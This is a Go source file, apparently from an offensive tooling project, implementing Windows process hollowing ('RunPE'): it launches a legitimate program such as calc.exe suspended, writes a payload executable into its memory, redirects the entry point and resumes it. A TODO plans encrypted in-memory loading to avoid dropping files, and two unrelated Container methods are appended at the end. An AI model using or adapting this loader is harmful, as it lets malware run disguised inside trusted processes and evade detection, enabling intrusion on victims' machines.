package core

import (
	"debug/pe"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

//_, state := RunPE("test.exe", "C:\\Windows\\System32\\calc.exe", "")
//if state {
// fmt.Println("Success")
//} else {
// fmt.Println("Fail")
//}

//TODO:
// Need to incorporate a encryption/decryption function to load the file encrypted as bytes for injections instead of just dropping the file then injecting.

func ExternalRunPE(payloadPath string, targetPath string, arguments string) (int, bool) {
	pid := 0
	state, pid := HollowProcess(payloadPath, targetPath, arguments)
	return pid, state
}

func HollowProcess(payloadPath, targetPath string, arguments string) (bool, int) {
	var payloadImageSize uint64
	loadedPE := LoadPEModule(payloadPath, &payloadImageSize, false, false)

	if loadedPE == 0 {
		return false, 0
	}

	payloadArch := GetNTHdrArch(loadedPE)

	if payloadArch != IMAGE_NT_OPTIONAL_HDR32_MAGIC && payloadArch != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
		return false, 0
	}

	is32BitPayload := !Is64Bit(loadedPE)

	isTargComp := IsTargetCompatible(loadedPE, targetPath)

	if !isTargComp {
		FreePEBuffer(loadedPE, payloadImageSize)
		//fmt.Println("0", "non Targ")
		return false, 0
	}

	var pi syscall.ProcessInformation
	isCreated := CreateSuspendedProcess(targetPath, &pi, arguments)

	if !isCreated {
		FreePEBuffer(loadedPE, payloadImageSize)
		//fmt.Println("2", "non created")
		return false, 0
	}

	isOK := _RunPE(loadedPE, payloadImageSize, &pi, is32BitPayload)

	if !isOK {
		TerminateProcess(pi.ProcessId)
	}
	FreePEBuffer(loadedPE, payloadImageSize)
	syscall.CloseHandle(pi.Thread)
	syscall.CloseHandle(pi.Process)
	return true, int(pi.ProcessId)
}

func TerminateProcess(pid uint32) bool {
	var isKilled bool
	hProcess, err := syscall.OpenProcess(syscall.PROCESS_TERMINATE, false, pid)
	if err != nil {
		return false
	}
	if err := syscall.TerminateProcess(hProcess, 0); err == nil {
		isKilled = true
	} else {
	}
	syscall.CloseHandle(hProcess)
	return isKilled
}

func GetFileSize(hFile syscall.Handle, lpFileSizeHigh uint32) (size uint64, e error) {
	r, _, err := procGetFileSize.Call(
		uintptr(hFile),
		uintptr(unsafe.Pointer(&lpFileSizeHigh)),
	)
	if r == 0 {
		e = err
	}
	size = uint64(r)
	return
}

func IsBadReadPtr(lp uintptr, ucb uint64) bool {
	r, _, _ := procIsBadReadPtr.Call(lp, uintptr(ucb))
	return r != 0
}

func VirtualAlloc(
	lpAddress uintptr, dwSize uint64, flAllocationType uint32, flProtect uint32,
) (addr uintptr, e error) {
	ret, _, err := procVirtualAlloc.Call(
		lpAddress,
		uintptr(dwSize),
		uintptr(flAllocationType),
		uintptr(flProtect))
	if ret == 0 {
		e = err
	}
	addr = ret
	return
}

func VirtualAllocEx(
	hProcess syscall.Handle, lpAddress uintptr, dwSize uint64, flAllocationType uint32, flProtect uint32,
) (addr uintptr, e error) {
	ret, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		lpAddress,
		uintptr(dwSize),
		uintptr(flAllocationType),
		uintptr(flProtect))
	if ret == 0 {
		e = err
	}
	addr = ret
	return
}

func LoadPEModule(fileName string, vSize *uint64, executable, relocate bool) uintptr {
	var rSize uint64
	dllRawData := LoadFile(fileName, &rSize)
	if dllRawData == 0 {
		return 0
	}
	mappedDll := _LoadPEModule(dllRawData, rSize, vSize, executable, relocate)
	FreePEBuffer(dllRawData, 0)
	return mappedDll
}

func AllocAligned(bufferSize uint64, protect uint32, desiredBase uint64) uintptr {
	buf, err := VirtualAlloc(
		uintptr(desiredBase), bufferSize, MEM_COMMIT|MEM_RESERVE, protect,
	)
	if err != nil {
	}
	return buf
}

func GetNTHdrs(peBuffer uintptr, bufferSize uint64) uintptr {
	if peBuffer == 0 {
		return 0
	}
	idh := (*IMAGE_DOS_HEADER)(unsafe.Pointer(peBuffer))
	if bufferSize != 0 {
		if !ValidatePtr(
			peBuffer,
			bufferSize,
			uintptr(unsafe.Pointer(idh)),
			uint64(unsafe.Sizeof(IMAGE_DOS_HEADER{})),
		) {
			return 0
		}
	}
	if IsBadReadPtr(
		uintptr(unsafe.Pointer(idh)), uint64(unsafe.Sizeof(IMAGE_DOS_HEADER{})),
	) {
		return 0
	}
	if idh.E_magic != IMAGE_DOS_SIGNATURE {
		return 0
	}
	var kMaxOffset int32 = 1024
	peOffset := idh.E_lfanew

	if peOffset > kMaxOffset {
		return 0
	}

	inh := (*IMAGE_NT_HEADERS)(unsafe.Pointer(peBuffer + uintptr(peOffset)))
	if bufferSize != 0 {
		if !ValidatePtr(
			peBuffer,
			bufferSize,
			unsafe.Sizeof(inh),
			uint64(unsafe.Sizeof(IMAGE_NT_HEADERS{})),
		) {
			return 0
		}
	}
	if IsBadReadPtr(
		uintptr(unsafe.Pointer(inh)), uint64(unsafe.Sizeof(IMAGE_DOS_HEADER{})),
	) {
		return 0
	}
	if inh.Signature != IMAGE_NT_SIGNATURE {
		return 0
	}
	return uintptr(unsafe.Pointer(inh))
}

func GetNTHdrArch(peBuffer uintptr) uint16 {
	ptr := unsafe.Pointer(GetNTHdrs(peBuffer, 0))
	if ptr == nil {
		return 0
	}
	inh := (*IMAGE_NT_HEADERS)(ptr)
	if IsBadReadPtr(
		uintptr(unsafe.Pointer(inh)),
		uint64(unsafe.Sizeof(IMAGE_NT_HEADERS{})),
	) {
		return 0
	}
	return inh.OptionalHeader.Magic
}

func Is64Bit(peBuffer uintptr) bool {
	arch := GetNTHdrArch(peBuffer)
	if arch == IMAGE_NT_OPTIONAL_HDR64_MAGIC {
		return true
	}
	return false
}

func GetImageBase(peBuffer uintptr) uintptr {
	is64b := Is64Bit(peBuffer)
	payloadNTHdr := unsafe.Pointer(GetNTHdrs(peBuffer, 0))
	if payloadNTHdr == nil {
		return 0
	}
	var imgBase uintptr
	if is64b {
		payloadNTHdr64 := (*IMAGE_NT_HEADERS64)(payloadNTHdr)
		imgBase = uintptr(payloadNTHdr64.OptionalHeader.ImageBase)
	} else {
		payloadNTHdr32 := (*IMAGE_NT_HEADERS)(payloadNTHdr)
		imgBase = uintptr(payloadNTHdr32.OptionalHeader.ImageBase)
	}
	return imgBase
}

func GetDirectoryEntry(
	peBuffer uintptr, dirID uint32, allowEmpty bool) *pe.DataDirectory {
	if dirID >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES {
		return nil
	}
	ntHeaders := unsafe.Pointer(GetNTHdrs(peBuffer, 0))
	if ntHeaders == nil {
		return nil
	}
	var peDir *pe.DataDirectory
	if Is64Bit(peBuffer) {
		ntHeaders64 := (*IMAGE_NT_HEADERS64)(ntHeaders)
		peDir = &(ntHeaders64.OptionalHeader.DataDirectory[dirID])
	} else {
		ntHeaders32 := (*IMAGE_NT_HEADERS)(ntHeaders)
		peDir = &(ntHeaders32.OptionalHeader.DataDirectory[dirID])
	}
	if !allowEmpty && peDir.VirtualAddress == 0 {
		return nil
	}
	return peDir
}

func HasRelocations(peBuffer uintptr) bool {
	relocDir := GetDirectoryEntry(peBuffer, pe.IMAGE_DIRECTORY_ENTRY_BASERELOC, false)
	if relocDir == nil {
		return false
	}
	return true
}

type ApplyRelocCallback struct {
	is64bit bool
	oldBase uintptr
	newBase uintptr
}

func (a *ApplyRelocCallback) processRelocField(relocField uintptr) bool {
	if a.is64bit {
		relocateAddr := (*uintptr)(unsafe.Pointer(relocField))
		rva := *relocateAddr - a.oldBase
		*relocateAddr = rva + a.newBase
	} else {
		relocateAddr := (*uint32)(unsafe.Pointer(relocField))
		rva := uintptr(*relocateAddr) - a.oldBase
		*relocateAddr = uint32(rva + a.newBase)
	}
	return true
}

func gApplyRelocations(
	modulePtr uintptr, moduleSize uint64, newBase, oldBase uintptr,
) bool {
	is64b := Is64Bit(modulePtr)
	callback := ApplyRelocCallback{is64b, oldBase, newBase}
	return ProcessRelocationTable(modulePtr, moduleSize, &callback)
}

func gProcessRelocBlock(
	block *BASE_RELOCATION_ENTRY,
	entriesNum uint64,
	page uint32,
	modulePtr uintptr,
	moduleSize uint64,
	is64bit bool,
	callback *ApplyRelocCallback,
) bool {
	entry := block
	var i uint64
	for i = 0; i < entriesNum; i++ {
		if !ValidatePtr(
			modulePtr,
			moduleSize,
			uintptr(unsafe.Pointer(entry)),
			uint64(unsafe.Sizeof(*new(BASE_RELOCATION_ENTRY))),
		) {
			break
		}
		offset := uint32(entry.GetOffset())
		eType := uint32(entry.GetType())

		if eType == 0 {
			break
		}
		if eType != RELOC_32BIT_FIELD && eType != RELOC_64BIT_FIELD {
			if &callback != nil {
			}
			return false
		}

		relocField := page + offset
		if relocField >= uint32(moduleSize) {
			if &callback != nil {
			}
			return false
		}
		if &callback != nil {
			isOK := callback.processRelocField(modulePtr + uintptr(relocField))
			if !isOK {
				return false
			}
		}
		entry = (*BASE_RELOCATION_ENTRY)(unsafe.Pointer(uintptr(unsafe.Pointer(entry)) + unsafe.Sizeof(*new(uint16))))
	}
	return true
}

func ProcessRelocationTable(
	modulePtr uintptr, moduleSize uint64, callback *ApplyRelocCallback,
) bool {
	relocDir := GetDirectoryEntry(modulePtr, IMAGE_DIRECTORY_ENTRY_BASERELOC, false)
	if relocDir == nil {
		return false
	}
	if !ValidatePtr(
		modulePtr,
		moduleSize,
		uintptr(unsafe.Pointer(relocDir)),
		uint64(unsafe.Sizeof(pe.DataDirectory{}))) {
		return false
	}
	maxSize := relocDir.Size
	relocAddr := relocDir.VirtualAddress
	is64b := Is64Bit(modulePtr)

	var reloc *IMAGE_BASE_RELOCATION

	var parsedSize uint32
	for parsedSize < maxSize {
		reloc = (*IMAGE_BASE_RELOCATION)(unsafe.Pointer(uintptr(relocAddr+parsedSize) + modulePtr))
		if !ValidatePtr(
			modulePtr,
			moduleSize,
			uintptr(unsafe.Pointer(reloc)),
			uint64(unsafe.Sizeof(IMAGE_BASE_RELOCATION{})),
		) {
			return false
		}
		parsedSize += reloc.SizeOfBlock

		if reloc.SizeOfBlock == 0 {
			break
		}

		var entriesNum uint64 = uint64((uintptr(reloc.SizeOfBlock) - (2 * unsafe.Sizeof(*new(uint32)))) / unsafe.Sizeof(*new(uint16)))
		page := reloc.VirtualAddress

		block := (*BASE_RELOCATION_ENTRY)(unsafe.Pointer(uintptr(unsafe.Pointer(reloc)) + unsafe.Sizeof(*new(uint32))*2))
		if !ValidatePtr(
			modulePtr,
			moduleSize,
			uintptr(unsafe.Pointer(block)),
			uint64(unsafe.Sizeof(*new(BASE_RELOCATION_ENTRY))),
		) {
			return false
		}

		if gProcessRelocBlock(
			block, entriesNum, page, modulePtr, moduleSize, is64b, callback) == false {
			return false
		}

	}
	return parsedSize != 0
}

func RelocateModule(
	modulePtr uintptr, moduleSize uint64, newBase, oldBase uintptr) bool {
	if modulePtr == 0 {
		return false
	}
	if oldBase == 0 {
		oldBase = GetImageBase(modulePtr)
	}
	if newBase == oldBase {
		return true
	}
	if gApplyRelocations(modulePtr, moduleSize, newBase, oldBase) {
		return true
	}
	return false
}

func AllocPEBuffer(bufferSize uint64, protect uint32, desiredBase uintptr) uintptr {
	return AllocAligned(bufferSize, protect, uint64(desiredBase))
}

func SectionsRawToVirtual(
	payload uintptr, payloadSize uint64, destBuffer uintptr, destBufferSize uint64,
) bool {
	if payload == 0 || destBuffer == 0 {
		return false
	}

	is64b := Is64Bit(payload)

	payloadNTHdr := unsafe.Pointer(GetNTHdrs(payload, 0))
	if payloadNTHdr == nil {
		return false
	}
	var fileHdr *pe.FileHeader
	var hdrSize uint32
	var secptr uintptr
	if is64b {
		payloadNTHdr64 := (*IMAGE_NT_HEADERS64)(payloadNTHdr)
		fileHdr = &(payloadNTHdr64.FileHeader)
		hdrSize = payloadNTHdr64.OptionalHeader.SizeOfHeaders
		secptr = uintptr(unsafe.Pointer(&(payloadNTHdr64.OptionalHeader))) + uintptr(fileHdr.SizeOfOptionalHeader)
	} else {
		payloadNTHdr32 := (*IMAGE_NT_HEADERS)(payloadNTHdr)
		fileHdr = &(payloadNTHdr32.FileHeader)
		hdrSize = payloadNTHdr32.OptionalHeader.SizeOfHeaders
		secptr = uintptr(unsafe.Pointer(&(payloadNTHdr32.OptionalHeader))) + uintptr(fileHdr.SizeOfOptionalHeader)
	}
	var firstRaw uint32
	var i uint16
	for i = 0; i < fileHdr.NumberOfSections; i++ {
		nextSec := (*pe.SectionHeader32)(unsafe.Pointer(secptr + uintptr(IMAGE_SIZEOF_SECTION_HEADER*i)))
		if !ValidatePtr(
			payload,
			destBufferSize,
			uintptr(unsafe.Pointer(nextSec)),
			IMAGE_SIZEOF_SECTION_HEADER,
		) {
			return false
		}
		if nextSec.PointerToRawData == 0 || nextSec.SizeOfRawData == 0 {
			continue
		}
		sectionMapped := destBuffer + uintptr(nextSec.VirtualAddress)
		sectionRawPtr := payload + uintptr(nextSec.PointerToRawData)
		secSize := uint64(nextSec.SizeOfRawData)

		if (uint64(nextSec.VirtualAddress) + secSize) > destBufferSize {
			if destBufferSize > uint64(nextSec.VirtualAddress) {
				secSize = destBufferSize - uint64(nextSec.VirtualAddress)
			} else {
				secSize = 0
			}
		}

		if (uint64(nextSec.VirtualAddress) >= destBufferSize) && secSize != 0 {
			return false
		}
		if (uint64(nextSec.PointerToRawData) + secSize) > destBufferSize {
			return false
		}
		if !ValidatePtr(payload, payloadSize, sectionRawPtr, secSize) {
			continue
		}
		if !ValidatePtr(destBuffer, destBufferSize, sectionMapped, secSize) {
			continue
		}
		Memcpy(
			unsafe.Pointer(sectionMapped), unsafe.Pointer(sectionRawPtr), int(secSize))
		if firstRaw == 0 || (nextSec.PointerToRawData < firstRaw) {
			firstRaw = nextSec.PointerToRawData
		}
	}

	if hdrSize == 0 {
		hdrSize = firstRaw
	}
	if !ValidatePtr(payload, destBufferSize, payload, uint64(hdrSize)) {
		return false
	}
	Memcpy(
		unsafe.Pointer(destBuffer), unsafe.Pointer(payload), int(hdrSize))
	return true
}

func VirtualFree(lpAddress uintptr, dwSize uint64, dwFreeType uint32) bool {
	r, _, _ := procVirtualFree.Call(lpAddress, uintptr(dwSize), uintptr(dwFreeType))
	return r != 0
}

func FreeAligned(buffer uintptr, bufferSize uint64) bool {
	if buffer == 0 {
		return true
	}
	if !VirtualFree(buffer, 0, MEM_RELEASE) {
		return false
	}
	return true
}

func FreePEBuffer(buffer uintptr, bufferSize uint64) bool {
	return FreeAligned(buffer, bufferSize)
}

func ValidatePtr(
	bufferBgn uintptr, bufferSize uint64, fieldBgn uintptr, fieldSize uint64,
) bool {
	if bufferBgn == 0 || fieldBgn == 0 {
		return false
	}
	start := bufferBgn
	end := start + uintptr(bufferSize)

	fieldStart := fieldBgn
	fieldEnd := fieldStart + uintptr(fieldSize)

	if fieldStart < start {
		return false
	}
	if fieldEnd > end {
		return false
	}
	return true
}

func PERawToVirtual(
	payload uintptr, inSize uint64, outSize *uint64, executable bool, desiredBase uintptr,
) uintptr {
	ntHdr := unsafe.Pointer(GetNTHdrs(payload, 0))
	if ntHdr == nil {
		return 0
	}
	var payloadImageSize uint32
	is64 := Is64Bit(payload)
	if is64 {
		payloadNtHdr := (*IMAGE_NT_HEADERS64)(ntHdr)
		payloadImageSize = payloadNtHdr.OptionalHeader.SizeOfImage
	} else {
		payloadNtHdr := (*IMAGE_NT_HEADERS)(ntHdr)
		payloadImageSize = payloadNtHdr.OptionalHeader.SizeOfImage
	}
	var protect uint32
	if executable {
		protect = PAGE_EXECUTE_READWRITE
	} else {
		protect = PAGE_READWRITE
	}

	localCopyAddress := AllocPEBuffer(uint64(payloadImageSize), protect, desiredBase)
	if localCopyAddress == 0 {
		return 0
	}

	if !SectionsRawToVirtual(payload, inSize, localCopyAddress, uint64(payloadImageSize)) {
		return 0
	}
	*outSize = uint64(payloadImageSize)
	return localCopyAddress
}

func IsTargetCompatible(
	payloadBuf uintptr, targetPath string) bool {
	if payloadBuf == 0 {
		return false
	}

	var targetSize uint64
	targetPE := LoadPEModule(targetPath, &targetSize, false, false)
	if targetPE == 0 {
		return false
	}
	is64bitTarget := Is64Bit(targetPE)
	FreePEBuffer(targetPE, 0)
	targetPE = 0
	targetSize = 0

	if is64bitTarget != Is64Bit(payloadBuf) {
		return false
	}
	return true
}

func CreateSuspendedProcess(path string, pi *syscall.ProcessInformation, arguments string) bool {
	var si syscall.StartupInfo
	siSize := unsafe.Sizeof(syscall.StartupInfo{})
	Memset(
		unsafe.Pointer(&si), 0, int(siSize))
	si.Cb = uint32(siSize)

	piSize := unsafe.Sizeof(syscall.ProcessInformation{})
	Memset(
		unsafe.Pointer(pi), 0, int(piSize))

	if err := syscall.CreateProcess(
		windows.StringToUTF16Ptr(path),
		windows.StringToUTF16Ptr(path+" "+arguments),
		nil,
		nil,
		false,
		CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		pi); err != nil {
		return false
	}
	return true
}

func LoadFile(fileName string, readSize *uint64) uintptr {
	file, err := syscall.CreateFile(
		windows.StringToUTF16Ptr(fileName),
		syscall.GENERIC_READ,
		syscall.FILE_SHARE_READ,
		nil,
		syscall.OPEN_EXISTING,
		syscall.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
	}
	if file == syscall.InvalidHandle {
		return 0
	}
	mapping, err := syscall.CreateFileMapping(file, nil, syscall.PAGE_READONLY, 0, 0, nil)
	if err != nil {
		syscall.CloseHandle(file)
		return 0
	}
	dllRawData, err := syscall.MapViewOfFile(mapping, syscall.FILE_MAP_READ, 0, 0, 0)
	if err != nil {
		syscall.CloseHandle(mapping)
		syscall.CloseHandle(file)
		return 0
	}

	rSize, err := GetFileSize(file, 0)
	if err != nil {
	}
	if *readSize != 0 && *readSize <= rSize {
		rSize = *readSize
	}
	if IsBadReadPtr(dllRawData, rSize) {
		syscall.UnmapViewOfFile(dllRawData)
		syscall.CloseHandle(mapping)
		syscall.CloseHandle(file)
		return 0
	}
	localCopyAddress := AllocAligned(rSize, syscall.PAGE_READWRITE, 0)
	if localCopyAddress != 0 {
		Memcpy(
			unsafe.Pointer(localCopyAddress), unsafe.Pointer(dllRawData), int(rSize))
		*readSize = rSize
	} else {
		*readSize = 0
	}
	syscall.UnmapViewOfFile(dllRawData)
	syscall.CloseHandle(mapping)
	syscall.CloseHandle(file)
	return localCopyAddress
}

func _LoadPEModule(dllRawData uintptr, rSize uint64, vSize *uint64, executable, relocate bool) uintptr {
	var desiredBase uintptr
	if relocate && !HasRelocations(dllRawData) {
		desiredBase = GetImageBase(dllRawData)
	}
	mappedDll := PERawToVirtual(dllRawData, rSize, vSize, executable, desiredBase)
	if mappedDll != 0 {
		if relocate && !RelocateModule(mappedDll, *vSize, mappedDll, 0) {
			FreePEBuffer(mappedDll, *vSize)
			mappedDll = 0
		}
	} else {
	}
	return mappedDll
}

func ResumeThread(hThread syscall.Handle) (count int32, e error) {
	ret, _, err := procResumeThread.Call(uintptr(hThread))
	if ret == 0xffffffff {
		e = err
	}
	count = int32(ret)
	return
}

func WriteProcessMemory(
	hProcess syscall.Handle, lpBaseAddress uintptr, data uintptr, size uint64,
) (e error) {
	var numBytesRead uint64
	r, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		lpBaseAddress,
		data,
		uintptr(size),
		uintptr(unsafe.Pointer(&numBytesRead)))
	if r == 0 {
		e = err
	}
	return
}

func Wow64GetThreadContext(h syscall.Handle, pc *WOW64_CONTEXT) bool {
	r, _, _ := procWow64GetThreadContext.Call(
		uintptr(h), uintptr(unsafe.Pointer(pc)),
	)
	if r == 0 {
		return false
	}

	return int(r) > 0
}

func Wow64SetThreadContext(h syscall.Handle, pc *WOW64_CONTEXT) bool {
	r, _, _ := procWow64SetThreadContext.Call(
		uintptr(h), uintptr(unsafe.Pointer(pc)),
	)
	if r == 0 {
		return false
	}

	return int(r) > 0
}

func GetThreadContext(hThread syscall.Handle, ctx *CONTEXT) (e error) {
	r, _, err := procGetThreadContext.Call(
		uintptr(hThread), uintptr(unsafe.Pointer(ctx)),
	)
	if r == 0 {
		e = err
	}
	return
}

func SetThreadContext(hThread syscall.Handle, ctx *CONTEXT) (e error) {
	r, _, err := procSetThreadContext.Call(
		uintptr(hThread), uintptr(unsafe.Pointer(ctx)),
	)
	if r == 0 {
		e = err
	}
	return
}

func UpdateImageBase(payload, destImageBase uintptr) bool {
	is64b := Is64Bit(payload)
	payloadNTHdr := unsafe.Pointer(GetNTHdrs(payload, 0))
	if payloadNTHdr == nil {
		return false
	}
	if is64b {
		payloadNTHdr64 := (*IMAGE_NT_HEADERS64)(payloadNTHdr)
		payloadNTHdr64.OptionalHeader.ImageBase = uint64(destImageBase)
	} else {
		payloadNTHdr32 := (*IMAGE_NT_HEADERS)(payloadNTHdr)
		payloadNTHdr32.OptionalHeader.ImageBase = uint32(destImageBase)
	}
	return true
}

func Memcpy(dest, src unsafe.Pointer, len size_t) unsafe.Pointer {

	cnt := len >> 3
	var i size_t = 0
	for i = 0; i < cnt; i++ {
		var pdest *uint64 = (*uint64)(usp(uintptr(dest) + uintptr(8*i)))
		var psrc *uint64 = (*uint64)(usp(uintptr(src) + uintptr(8*i)))
		*pdest = *psrc
	}
	left := len & 7
	for i = 0; i < left; i++ {
		var pdest *uint8 = (*uint8)(usp(uintptr(dest) + uintptr(8*cnt+i)))
		var psrc *uint8 = (*uint8)(usp(uintptr(src) + uintptr(8*cnt+i)))

		*pdest = *psrc
	}
	return dest
}

func Memset(dest unsafe.Pointer, ch int8, len size_t) unsafe.Pointer {

	left := len & 7
	cnt := len >> 3
	if cnt > 0 {
		left += 8
	}
	var i size_t = 0
	for i = 0; i < left; i++ {
		var pdest *int8 = (*int8)(usp(uintptr(dest) + uintptr(i)))
		*pdest = ch
	}
	if cnt < 2 {
		return dest
	}
	var pfirst *int64 = (*int64)(dest)

	for i = 0; i < cnt-1; i++ {
		var pdest *int64 = (*int64)(usp(uintptr(dest) + uintptr(left+8*i)))
		*pdest = *pfirst
	}

	return dest
}

func GetEntryPointRVA(peBuffer uintptr) uint32 {
	is64b := Is64Bit(peBuffer)
	payloadNTHdr := unsafe.Pointer(GetNTHdrs(peBuffer, 0))
	if payloadNTHdr == nil {
		return 0
	}
	var value uint32
	if is64b {
		payloadNTHdr64 := (*IMAGE_NT_HEADERS64)(payloadNTHdr)
		value = payloadNTHdr64.OptionalHeader.AddressOfEntryPoint
	} else {
		payloadNTHdr32 := (*IMAGE_NT_HEADERS)(payloadNTHdr)
		value = payloadNTHdr32.OptionalHeader.AddressOfEntryPoint
	}
	return value
}

func UpdateRemoteEntryPoint(
	pi *syscall.ProcessInformation, entryPointVA uintptr, is32bit bool,
) bool {
	if is32bit {
		var context WOW64_CONTEXT
		Memset(
			unsafe.Pointer(&context), 0, int(unsafe.Sizeof(WOW64_CONTEXT{})))
		context.ContextFlags = CONTEXT_INTEGER
		if !Wow64GetThreadContext(pi.Thread, &context) {
			return false
		}
		context.Eax = uint32(entryPointVA)
		return Wow64SetThreadContext(pi.Thread, &context)
	}
	var context CONTEXT
	Memset(
		unsafe.Pointer(&context), 0, int(unsafe.Sizeof(CONTEXT{})))
	context.contextflags = CONTEXT_INTEGER
	err := GetThreadContext(pi.Thread, &context)
	if err != nil {
		return false
	}
	context.rcx = uint64(entryPointVA)
	err = SetThreadContext(pi.Thread, &context)
	if err != nil {
		return false
	}
	return true
}

func GetRemotePebAddr(pi *syscall.ProcessInformation, is32bit bool) uintptr {
	if is32bit {
		var context WOW64_CONTEXT
		Memset(
			unsafe.Pointer(&context), 0, int(unsafe.Sizeof(WOW64_CONTEXT{})))
		context.ContextFlags = CONTEXT_INTEGER
		if !Wow64GetThreadContext(pi.Thread, &context) {
			return 0
		}
		return uintptr(context.Ebx)
	}
	var PEBAddr uintptr
	var context CONTEXT
	Memset(
		unsafe.Pointer(&context), 0, int(unsafe.Sizeof(CONTEXT{})))
	context.contextflags = CONTEXT_INTEGER
	err := GetThreadContext(pi.Thread, &context)
	if err != nil {
		return 0
	}
	PEBAddr = uintptr(context.rdx)
	return PEBAddr
}

func GetImgBasePebOffset(is32bit bool) uintptr {
	var imgBaseOffset uintptr
	if is32bit {
		imgBaseOffset = unsafe.Sizeof(*new(uint32)) * 2
	} else {
		imgBaseOffset = unsafe.Sizeof(*new(uintptr)) * 2
	}
	return imgBaseOffset
}

func RedirectToPayload(
	loadedPE uintptr, loadBase uintptr, pi *syscall.ProcessInformation, is32bit bool,
) bool {
	ep := GetEntryPointRVA(loadedPE)
	epVA := loadBase + uintptr(ep)
	if UpdateRemoteEntryPoint(pi, epVA, is32bit) == false {
		return false
	}
	remotePebAddr := GetRemotePebAddr(pi, is32bit)
	if remotePebAddr == 0 {
		return false
	}
	remoteImgBase := remotePebAddr + GetImgBasePebOffset(is32bit)
	var imgBaseSize uint64
	if is32bit {
		imgBaseSize = uint64(unsafe.Sizeof(*new(uint32)))
	} else {
		imgBaseSize = uint64(unsafe.Sizeof(*new(uintptr)))
	}
	err := WriteProcessMemory(
		pi.Process, remoteImgBase, uintptr(unsafe.Pointer(&loadBase)), imgBaseSize)
	if err != nil {
		return false
	}
	return true
}

func _RunPE(
	loadedPE uintptr, payloadImageSize uint64, pi *syscall.ProcessInformation, is32bit bool,
) bool {
	if loadedPE == 0 {
		return false
	}

	remoteBase, err := VirtualAllocEx(
		pi.Process, 0, payloadImageSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		return false
	}

	idh := (*IMAGE_DOS_HEADER)(unsafe.Pointer(loadedPE))
	if false {
		if !ValidatePtr(
			loadedPE,
			0,
			uintptr(unsafe.Pointer(idh)),
			uint64(unsafe.Sizeof(IMAGE_DOS_HEADER{})),
		) {
		}
	}
	inh := (*IMAGE_NT_HEADERS)(unsafe.Pointer(loadedPE + uintptr(idh.E_lfanew)))
	is64b := Is64Bit(loadedPE)
	payloadNTHdr := unsafe.Pointer(GetNTHdrs(loadedPE, 0))
	if payloadNTHdr == nil {
	}
	if is64b {
		inh.OptionalHeader.Subsystem = 2
	} else {
		inh.OptionalHeader.Subsystem = 2
	}
	if !RelocateModule(loadedPE, payloadImageSize, remoteBase, 0) {
		return false
	}
	UpdateImageBase(loadedPE, remoteBase)

	err = WriteProcessMemory(
		pi.Process, remoteBase, loadedPE, payloadImageSize)
	if err != nil {
		return false
	}
	if !RedirectToPayload(loadedPE, remoteBase, pi, is32bit) {
		return false
	}

	ResumeThread(pi.Thread)
	return true
}

func (container *Container) Save(obj Ptr) {
	container.Rows = append(container.Rows, make([]byte, container.ti.Pos[container.ti.fields-1]+container.ti.Size[container.ti.fields-1]))
	n := len(container.Rows)
	for i := 0; i < container.ti.fields; i++ {
		container.ti.Save[i](container.Rows[n-1], Ptr(uintptr(obj)+container.ti.Offset[i]), container.ti, i)
	}
}

func (container *Container) Dump(n int, obj Ptr) {

	for i := 0; i < container.ti.fields; i++ {
		container.ti.Dump[i](container.Rows[n], Ptr(uintptr(obj)+container.ti.Offset[i]), container.ti, i)
	}

}
